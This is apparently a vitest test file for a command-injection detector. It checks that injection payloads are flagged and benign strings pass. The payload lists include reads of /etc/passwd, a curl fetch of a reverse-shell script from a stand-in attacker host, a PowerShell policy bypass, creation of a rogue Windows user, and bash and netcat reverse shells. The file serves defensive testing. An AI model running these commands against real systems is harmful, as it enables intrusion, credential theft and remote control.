import { describe, it, expect } from 'vitest';
import { CommandInjectionDetector } from '../src/core/detectors/command-injection.js';

describe('CommandInjectionDetector', () => {
  const detector = new CommandInjectionDetector();

  it('should detect shell chaining with reconnaissance commands', () => {
    const payloads = [
      '; cat /etc/passwd',
      '| id',
      '&& whoami',
      '; uname -a',
      'test && curl http://attacker.com/rev.sh',
      '; powershell.exe -ExecutionPolicy Bypass',
      '& dir C:\\',
      '; net user hacker password /add',
    ];

    for (const payload of payloads) {
      const result = detector.detectValue(payload);
      expect(result.detected, `Payload failed: ${payload}`).toBe(true);
    }
  });

  it('should detect command substitution', () => {
    const payloads = [
      '$(whoami)',
      '`cat /etc/passwd`',
      '$(id)',
    ];

    for (const payload of payloads) {
      const result = detector.detectValue(payload);
      expect(result.detected, `Payload failed: ${payload}`).toBe(true);
    }
  });

  it('should detect reverse shell patterns', () => {
    const payloads = [
      '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      'nc -e /bin/sh 192.168.1.1 1234',
    ];

    for (const payload of payloads) {
      const result = detector.detectValue(payload);
      expect(result.detected, `Payload failed: ${payload}`).toBe(true);
    }
  });

  it('should allow legitimate strings', () => {
    const safeInputs = [
      'Hello world',
      'apples & oranges',
      'formula: x | y',
      'user_123',
      'cat photo description',
    ];

    for (const input of safeInputs) {
      const result = detector.detectValue(input);
      expect(result.detected, `Safe input falsely flagged: ${input}`).toBe(false);
    }
  });
});
